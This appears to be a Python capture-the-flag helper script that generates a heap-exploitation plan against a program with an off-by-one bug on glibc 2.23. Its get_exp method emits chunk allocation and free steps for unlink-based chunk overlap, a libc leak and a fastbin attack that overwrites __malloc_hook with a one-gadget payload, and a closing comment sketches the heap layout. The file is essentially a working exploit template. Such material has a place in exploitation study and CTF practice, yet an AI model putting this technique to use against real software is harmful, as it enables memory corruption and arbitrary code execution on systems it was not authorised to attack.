#coding:utf-8
from sys import exit
import logging as log

# log = logging.getLogger()

'''
assume has add, delete and show methods
read add have off-by-one vuln
'''

class OffByOne(object):
    """
    arch = amd64
    libc version = 2.23
    """
    def __init__(self):
        self.operations = []
        self.vuln_idx = -1
        self.add_var_range = [-1, -1]
    def set_add(self, const_sizes, var_range, vuln_idx):
        """
        init the behavior off add method

        Args:
            size must align to 16 !
            assume const_size malloced before var_size
            const_sizes: the const sizes of CHUNK malloc memeory each time
                add method is called. can be zero
            var_range: the range of user controlable CHUNK size malloced
            vuln_idx: the off-by-one vuln in which area. must be 0 or 1
                0 --- const_size mem
                1 --- var_size mem
        """
        if vuln_idx != 0 and vuln_idx != 1:
            log.error("wrong vuln_idx : "+str(vuln_idx))
            exit(-1)
        for const_size in const_sizes:
            if const_size&0xf != 0 or const_size > 0x80 or const_size==0x70:
                log.error("unsupported const_size(too large) : " + hex(const_size))
                exit(-1)
        if var_range[0]&0xf != 0 or var_range[1]&0xf != 0:
            log.error("size must align to 0x10!")
            exit(-1)
        if var_range[0] > 0x70 or var_range[1] < 0x90:
            log.error("unsupported var_range : " + str(var_range))
            exit(-1)
        self.add_const_sizes = const_sizes
        self.add_var_range = var_range
        self.vuln_idx = vuln_idx

    def show_ops(self):
        for op in self.operations:
            print(op) 
    # def set_delete
    def get_exp(self):
        used_idxs = []
        self.operations = []
        def next_idx():
            for i in range(0, 1000):
                if i in used_idxs:
                    continue
                used_idxs.append(i)
                return i
            raise Exception("no more malloc")
        def op_add(size, content):
            idx = next_idx()
            self.operations.append("add(io, %s, %s) # %d"%(hex(size), content, idx))
            return idx
        def op_del(idx):
            used_idxs.remove(idx)
            self.operations.append("delete(io, %d)"%(idx))
        # self.operations.append("# you should leak libc first\n")
        if self.vuln_idx == 1:
        # prepare chunks
            self.operations.append("# fill fast bin for const-size")
            if len(self.add_const_sizes) != 0:
                tx = []
                for const_size in self.add_const_sizes:
                    # could mofiy this
                    for i in range(2):
                        tx.append(op_add(const_size-8, 'aaa'))
                for t in tx:
                    op_del(t)
                self.operations.append("# now const_size fastbin have some chunks\n")
            a = op_add(0x100-8, '"aaa"')
            b = op_add(0x70-8, '"bbb"')
            c = op_add(0x100-8, '"ccc"')
            d = op_add(0x70-8, '"ddd"')
            op_del(a)
            op_del(b)
            self.operations.append("\n# off-by-one")
            b = op_add(0x70-8, "'a'*0x60 + p64("+hex(0x170)+")")
            self.operations.append("\n# unlink")
            op_del(c)
            self.operations.append("\n# overlap")
            a = op_add(0x100-8, '"aaa"')
            self.operations.append("\n# now you can show %d to leak libc\n"%(b))
            e = op_add(0x70-8, '"eee"')
            self.operations.append("# now %d and %d pointer to same addr"%(b, e))
            self.operations.append("\n# fastbin attack")
            op_del(b)
            op_del(d)
            op_del(e)
            self.operations.append("\n# you should check the fast bin :P")
            self.operations.append("fake = libc.symbols['__malloc_hook'] - 0x23 # malloc hook ")
            self.operations.append("payload = \"a\"*19 + p64(one)")
            self.operations.append("# payload = 'a'*11 + p64(one) + p64(libc.symbols['realloc'] + offset)")
            x = op_add(0x70-8, "p64(fake)")
            y = op_add(0x70-8, "p64(fake)")
            z = op_add(0x70-8, "payload")
            k = op_add(0x70-8, "payload") 
            self.operations.append("\n# check the malloc :P\n #p __malloc_hook")
            self.operations.append("# then modify some offset or try realloc")
        else:
            log.info("not implemented yet")
            exit(-1)

        return self.operations
        # leak libc
        # off-by-one 
        # unlink
        # overlap chunk

def test():
    obo = OffByOne()
    obo.set_add([], [0x20, 0x100], 1)
    exp = obo.get_exp()
    obo.show_ops()
    
test()



''' off by one
---
0x100 A
---
0x70 B
---
0x100 C
---
0x20 D
--- 
0x30 E


malloc A B C D
FREE A
FREE B
FREE D fill fast bin
FREE E fill fast bin
ADD B1 -> OFF BY NULL
FREE C -> unlink A
mallc A
malloc B2 -> overlap chunk
free B1
free B2
'''